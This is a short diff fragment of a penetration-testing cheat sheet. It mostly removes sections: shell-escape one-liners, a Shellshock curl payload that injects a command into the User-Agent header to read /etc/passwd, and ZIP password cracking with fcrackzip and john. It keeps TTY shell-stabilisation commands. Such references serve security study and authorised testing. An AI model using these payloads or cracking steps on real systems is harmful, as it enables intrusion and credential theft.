-/bin/bash -i
-
-# Perl
-perl -e 'exec "/bin/bash"'
-
-# Ruby
-exec "/bin/bash"
-
-# Lua
-os.execute('/bin/bash')
-```
 
 ### Adjust Interactive shell
 
@@ -2180,14 +1512,6 @@ fg
 export SHELL=bash
 export TERM=xterm OR export TERM=xterm-256color
 stty rows 50 columns 235
-```
-
-------
-
-## SHELLSHOCK
-
-```
-curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
 ```
 
 ------
@@ -2274,15 +1598,3 @@ dir /a
 # Find a file
 dir /b/s "<FILE>"
 ```
-
-------
-
-## ZIP
-
-```
-fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip
-
-zip2john file.zip > zip.john
-john --wordlist=<PASSWORDS_LIST> zip.john
-```
-
